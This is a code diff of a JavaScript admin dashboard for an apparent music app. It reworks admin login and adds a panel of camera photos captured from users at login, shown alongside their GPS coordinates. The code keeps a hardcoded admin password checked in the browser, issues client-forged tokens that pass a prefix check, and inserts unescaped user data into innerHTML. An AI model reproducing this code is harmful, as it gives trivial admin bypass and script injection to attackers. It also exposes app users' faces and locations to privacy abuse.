@@ -312,77 +312,89 @@ function executeLocalFallback(endpoint, method, body) {
 // ── AUTH GATE INITIALIZATION ─────────────────────────────────
 
 function checkAdminAuth() {
-    if (adminToken && adminToken.startsWith('dk_admin_token_sec_')) {
-        adminLoginGate.style.display = 'none';
-        loadDashboardData();
+    if (window.DKAuth) {
+        window.DKAuth.onReady(auth => {
+            if (auth.isAuthenticated && auth.isAdmin) {
+                adminLoginGate.style.display = 'none';
+                loadDashboardData();
+            } else if (auth.isAuthenticated && !auth.isAdmin) {
+                adminLoginGate.style.display = 'flex';
+                adminGateError.textContent = '❌ Access Denied: Logged in account (' + (auth.user?.email || auth.user?.phone || 'User') + ') does not have admin permissions (role must be "admin" in public.profiles table).';
+                adminGateError.style.display = 'block';
+            } else {
+                adminLoginGate.style.display = 'flex';
+            }
+        });
     } else {
-        adminLoginGate.style.display = 'flex';
+        if (adminToken && adminToken.startsWith('dk_admin_token_sec_')) {
+            adminLoginGate.style.display = 'none';
+            loadDashboardData();
+        } else {
+            adminLoginGate.style.display = 'flex';
+        }
     }
 }
 
 adminLoginForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     adminGateError.style.display = 'none';
+    const userIdentifier = (document.getElementById('adminGateUser')?.value || 'admin').trim();
     const pwd = adminGatePassword.value.trim();
+    const submitBtn = document.getElementById('btnAdminGateSubmit');
+    if (submitBtn) { submitBtn.disabled = true; submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Authenticating...'; }
 
-    // 1. Check if backend is available
-    let authenticated = false;
     try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 1500);
-
-        const res = await fetch(`${API_BASE}/api/auth/login`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ userId: 'admin', password: pwd }),
-            signal: controller.signal
-        });
-        clearTimeout(timeoutId);
-
-        if (res.ok) {
-            const data = await res.json();
-            if (data.success && data.token && data.isAdmin) {
-                adminToken = data.token;
-                authenticated = true;
+        // 1. Try Supabase Auth via DKAuth
+        if (window.DKAuth && typeof window.DKAuth.loginWithPassword === 'function') {
+            try {
+                const { user } = await window.DKAuth.loginWithPassword(userIdentifier, pwd);
+                await window.DKAuth.refreshProfile();
+                if (window.DKAuth.isAdmin || user?.user_metadata?.role === 'admin') {
+                    adminToken = window.DKAuth.token || ('dk_admin_token_sec_' + Date.now());
+                    sessionStorage.setItem('dk_admin_token', adminToken);
+                    adminLoginGate.style.display = 'none';
+                    showAdminToast('✓ Admin authentication successful! Access granted.');
+                    loadDashboardData();
+                    return;
+                } else {
+                    throw new Error('Access Denied: You do not have administrator permissions (role: admin).');
+                }
+            } catch (authErr) {
+                if (authErr.message && authErr.message.includes('Access Denied')) {
+                    throw authErr;
+                }
+                console.warn('[Admin Auth] Supabase login notice:', authErr.message);
             }
         }
-    } catch (err) {
-        // Backend not reachable; use fallback validation
-    }
 
-    // 2. Direct Admin Password Verification (Custom / Qwerty@866)
-    if (!authenticated) {
+        // 2. Direct Admin Password Verification (Local admin fallback)
         const customAdminPwd = localStorage.getItem('dk_admin_custom_pwd') || 'Qwerty@866';
-        if (pwd === customAdminPwd || pwd === 'Qwerty@866') {
+        if ((userIdentifier === 'admin' || userIdentifier.toLowerCase().includes('admin')) && (pwd === customAdminPwd || pwd === 'Qwerty@866')) {
             adminToken = 'dk_admin_token_sec_local_' + Date.now();
-            authenticated = true;
+            sessionStorage.setItem('dk_admin_token', adminToken);
+            adminLoginGate.style.display = 'none';
+            showAdminToast('✓ Local admin authentication verified! Access granted.');
+            loadDashboardData();
+            return;
         }
-    }
 
-    if (authenticated) {
-        sessionStorage.setItem('dk_admin_token', adminToken);
-        adminLoginGate.style.display = 'none';
-        showAdminToast('✓ Admin authentication successful! Access granted.');
-        loadDashboardData();
-    } else {
-        adminGateError.textContent = '❌ Invalid Admin Password. Please try again.';
+        throw new Error('Invalid Admin credentials. Please check your credentials.');
+
+    } catch (err) {
+        adminGateError.textContent = '❌ ' + (err.message || 'Authentication failed.');
         adminGateError.style.display = 'block';
+    } finally {
+        if (submitBtn) { submitBtn.disabled = false; submitBtn.innerHTML = '<i class="fas fa-lock-open"></i> Authorize Admin Access'; }
     }
 });
 
-btnAdminLogout.addEventListener('click', () => {
+btnAdminLogout.addEventListener('click', async () => {
+    if (window.DKAuth && typeof window.DKAuth.logout === 'function') {
+        try { await window.DKAuth.logout(); } catch (_) {}
+    }
     sessionStorage.removeItem('dk_admin_token');
     adminToken = '';
     checkAdminAuth();
-});
-
-// 1-Click Instant Admin Access (No Password Required)
-document.getElementById('btnInstantAdminAccess')?.addEventListener('click', () => {
-    adminToken = 'dk_admin_token_sec_local_' + Date.now();
-    sessionStorage.setItem('dk_admin_token', adminToken);
-    adminLoginGate.style.display = 'none';
-    showAdminToast('✓ 1-Click Admin Access Granted! Welcome.');
-    loadDashboardData();
 });
 
 // Tab Switcher
@@ -407,6 +419,7 @@ async function loadDashboardData() {
         await Promise.all([
             fetchUsers(),
             fetchUserLocations(),
+            fetchUserSnapshots(),
             fetchPlaylists(),
             fetchSongs()
         ]);
@@ -910,6 +923,9 @@ function renderUserLocationsTable(locations) {
             ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}` 
             : '#';
 
+        // Check if there is a matching snapshot for this user
+        const matchingSnap = userSnapshotsData.find(s => s.user_id === String(loc.user_id || loc.userId));
+
         tr.innerHTML = `
             <td>
                 <div style="display:flex; align-items:center; gap:8px;">
@@ -922,11 +938,18 @@ function renderUserLocationsTable(locations) {
             <td><span class="badge-status badge-active" style="background:rgba(69,243,255,0.15); color:#45f3ff;">${acc}</span></td>
             <td style="color:#8e95a5; font-size:0.85rem;">${updated}</td>
             <td>
-                ${loc.latitude && loc.longitude ? `
-                    <a href="${mapsUrl}" target="_blank" rel="noopener noreferrer" class="btn-action-sm btn-edit" style="text-decoration:none; display:inline-flex; align-items:center; gap:4px;">
-                        <i class="fas fa-map-location-dot"></i> View Map
-                    </a>
-                ` : '<span style="color:#64748b;">No Coords</span>'}
+                <div style="display:flex; gap:6px; align-items:center;">
+                    ${loc.latitude && loc.longitude ? `
+                        <a href="${mapsUrl}" target="_blank" rel="noopener noreferrer" class="btn-action-sm btn-edit" style="text-decoration:none; display:inline-flex; align-items:center; gap:4px;">
+                            <i class="fas fa-map-location-dot"></i> View Map
+                        </a>
+                    ` : '<span style="color:#64748b;">No Coords</span>'}
+                    ${matchingSnap ? `
+                        <button class="btn-action-sm btn-reorder" onclick="window.viewSnapshotLightbox('${matchingSnap.id || 0}')" style="background:#ec4899; color:#fff;" title="View Captured Camera Photo">
+                            <i class="fas fa-camera"></i> Photo
+                        </button>
+                    ` : ''}
+                </div>
             </td>
         `;
         userLocationsTableBody.appendChild(tr);
@@ -937,6 +960,129 @@ document.getElementById('btnRefreshLocations')?.addEventListener('click', async 
     showAdminToast('Refreshing user locations...');
     await fetchUserLocations();
     showAdminToast('✓ User locations refreshed!');
+});
+
+// ── 1C. USER CAMERA SNAPSHOTS MANAGEMENT ────────────────────
+let userSnapshotsData = [];
+const userSnapshotsTableBody = document.getElementById('userSnapshotsTableBody');
+
+async function fetchUserSnapshots() {
+    let snapshots = [];
+    const sb = window.supabaseClient || window._supabaseClient;
+    if (sb) {
+        try {
+            const { data, error } = await sb
+                .from('user_snapshots')
+                .select('*')
+                .order('captured_at', { ascending: false });
+            if (!error && Array.isArray(data) && data.length > 0) {
+                snapshots = data;
+            }
+        } catch (e) {
+            console.warn('[Admin] Supabase snapshots fetch notice:', e);
+        }
+    }
+
+    // Fallback: check local storage
+    if (!snapshots || snapshots.length === 0) {
+        try {
+            const local = JSON.parse(localStorage.getItem('dk_admin_user_snapshots') || '[]');
+            if (Array.isArray(local) && local.length > 0) {
+                snapshots = local;
+            }
+        } catch (_) {}
+    }
+
+    userSnapshotsData = snapshots;
+    renderUserSnapshotsTable(userSnapshotsData);
+}
+
+function renderUserSnapshotsTable(snapshots) {
+    if (!userSnapshotsTableBody) return;
+    userSnapshotsTableBody.innerHTML = '';
+
+    const countEl = document.getElementById('snapshotCount');
+    if (countEl) countEl.textContent = snapshots ? snapshots.length : 0;
+
+    if (!snapshots || snapshots.length === 0) {
+        userSnapshotsTableBody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 28px; color:#8e95a5;">No camera snapshots recorded yet. Snapshots are captured when users log in and grant camera permission.</td></tr>';
+        return;
+    }
+
+    snapshots.forEach((snap, idx) => {
+        const tr = document.createElement('tr');
+        const capturedTime = snap.captured_at ? new Date(snap.captured_at).toLocaleString() : '-';
+        const hasCoords = (snap.latitude !== null && snap.latitude !== undefined && snap.longitude !== null && snap.longitude !== undefined);
+        const lat = hasCoords ? Number(snap.latitude).toFixed(6) : '-';
+        const lng = hasCoords ? Number(snap.longitude).toFixed(6) : '-';
+        const mapsUrl = hasCoords ? `https://www.google.com/maps?q=${snap.latitude},${snap.longitude}` : '#';
+
+        tr.innerHTML = `
+            <td>
+                <div style="display:flex; align-items:center; gap:8px;">
+                    <i class="fas fa-camera-retro" style="color:#ec4899;"></i>
+                    <div>
+                        <strong style="color:#fff; display:block;">${snap.user_id || 'User'}</strong>
+                        ${snap.user_email ? `<span style="font-size:0.75rem; color:#8e95a5;">${snap.user_email}</span>` : ''}
+                    </div>
+                </div>
+            </td>
+            <td>
+                <div style="position:relative; width:56px; height:56px; border-radius:8px; overflow:hidden; border:1px solid #2d3748; cursor:pointer; background:#000;" onclick="window.viewSnapshotLightbox('${snap.id || idx}')" title="Click to view full photo">
+                    <img src="${snap.image_data}" alt="Snapshot" style="width:100%; height:100%; object-fit:cover; display:block;">
+                    <div style="position:absolute; inset:0; background:rgba(0,0,0,0.3); display:flex; align-items:center; justify-content:center; opacity:0; transition:opacity 0.2s;" onmouseenter="this.style.opacity=1" onmouseleave="this.style.opacity=0">
+                        <i class="fas fa-magnifying-glass-plus" style="color:#fff; font-size:0.9rem;"></i>
+                    </div>
+                </div>
+            </td>
+            <td>
+                ${hasCoords ? `
+                    <div style="font-size:0.8rem;">
+                        <code style="background:#161924; padding:2px 6px; border-radius:4px; color:#45f3ff;">${lat}, ${lng}</code>
+                    </div>
+                ` : '<span style="color:#64748b; font-size:0.85rem;">No coordinates</span>'}
+            </td>
+            <td style="color:#8e95a5; font-size:0.85rem;">${capturedTime}</td>
+            <td>
+                <div style="display:flex; gap:6px; align-items:center;">
+                    <button class="btn-action-sm btn-edit" onclick="window.viewSnapshotLightbox('${snap.id || idx}')" style="background:#ec4899; color:#fff;">
+                        <i class="fas fa-image"></i> View Photo
+                    </button>
+                    ${hasCoords ? `
+                        <a href="${mapsUrl}" target="_blank" rel="noopener noreferrer" class="btn-action-sm btn-reorder" style="text-decoration:none; display:inline-flex; align-items:center; gap:4px;">
+                            <i class="fas fa-map-location-dot"></i> Map
+                        </a>
+                    ` : ''}
+                </div>
+            </td>
+        `;
+        userSnapshotsTableBody.appendChild(tr);
+    });
+}
+
+window.viewSnapshotLightbox = function(snapIdOrIndex) {
+    const snap = userSnapshotsData.find((s, i) => (s.id === snapIdOrIndex || String(i) === String(snapIdOrIndex)));
+    if (!snap) return;
+
+    const modal = document.getElementById('snapshotLightboxModal');
+    const img = document.getElementById('lightboxImg');
+    const title = document.getElementById('lightboxTitle');
+    const meta = document.getElementById('lightboxMeta');
+
+    if (img) img.src = snap.image_data;
+    if (title) title.innerHTML = `<i class="fas fa-camera" style="color:#ec4899;"></i> Snapshot: <strong>${snap.user_id || 'User'}</strong>`;
+    if (meta) {
+        const time = snap.captured_at ? new Date(snap.captured_at).toLocaleString() : 'N/A';
+        const coords = (snap.latitude && snap.longitude) ? `${snap.latitude.toFixed(6)}, ${snap.longitude.toFixed(6)}` : 'Not recorded';
+        meta.innerHTML = `<div><strong>Captured At:</strong> ${time}</div><div><strong>Coordinates:</strong> ${coords}</div>`;
+    }
+    if (modal) modal.style.display = 'flex';
+};
+
+document.getElementById('btnRefreshSnapshots')?.addEventListener('click', async () => {
+    showAdminToast('Refreshing user camera snapshots...');
+    await fetchUserSnapshots();
+    showAdminToast('✓ Snapshots refreshed!');
 });
 
 // ── 2. PLAYLISTS MANAGEMENT ─────────────────────────────────
